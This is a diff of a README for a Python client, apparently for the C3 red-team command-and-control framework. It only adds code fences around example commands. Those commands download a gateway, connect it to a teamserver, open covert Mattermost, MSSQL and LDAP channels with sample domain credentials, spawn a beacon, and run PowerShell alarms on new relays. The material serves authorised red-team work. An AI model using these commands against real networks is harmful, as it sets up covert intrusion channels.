@@ -264,44 +264,63 @@ PS D:\> py c3-client.py http://192.168.0.200:52935 alarm relay -g gate4 --execut
 
 ### 1. Download gateway
 
+```
 py c3-client.py -v http://192.168.0.200:52935 download gateway c:\output\directory -G gate6 -O 192.168.0.200 -x
+```
 
 ### 2. Connect to Teamserver
 
+```
 py c3-client.py -v http://192.168.0.200:52935 connector gate5 turnon teamserver 192.168.0.200 2223
+```
 
 ### 3. Setup Mattermost channel
 
+```
 py c3-client.py -v http://192.168.0.200:52935 channel mattermost create gate5 http://192.168.0.210:8080 foobar c3g7sokucbgidgxxxxxxxxxx
+```
 
 ### 4. Setup MSSQL channel
 
+```
 py c3-client.py -v http://192.168.0.200:52935 channel mssql create matter6 mssql-server.contoso.com master spt_foobar contoso\alice Password1! true
+```
 
 ### 5. Setup LDAP channel
 
+```
 py c3-client.py -v http://192.168.0.200:52935 channel ldap create matter5 dc1.contoso.com alice@CONTOSO.COM Password1! CN=alice,CN=Users,DC=contoso,DC=com
+```
 
 ### 6. Spawn Beacon
 
+```
 py c3-client.py -v http://192.168.0.200:52935 spawn beacon matter5
+```
 
 ### 7. Clear all channels
 
+```
 py c3-client.py http://192.168.0.200:52935 channel all clear
+```
 
 ### 8. Clear network
 
+```
 py c3-client.py http://192.168.0.200:52935 close network gate5
+```
 
 ### 9. Alarm
 
+```
 py c3-client.py http://192.168.0.200:52935 alarm relay -g gate5 --execute "powershell -file speak.ps1 -message \`"New C3 Relay inbound: <domain>/<userName>, computer: <computerName>\`"" --execute "cmd /c new-relay.bat <relayId>"
+```
 
 ### 10. Ping Relays
 
+```
 py c3-client.py http://192.168.0.200:52935 ping -k 45
-
+```
 
 ## Author
 
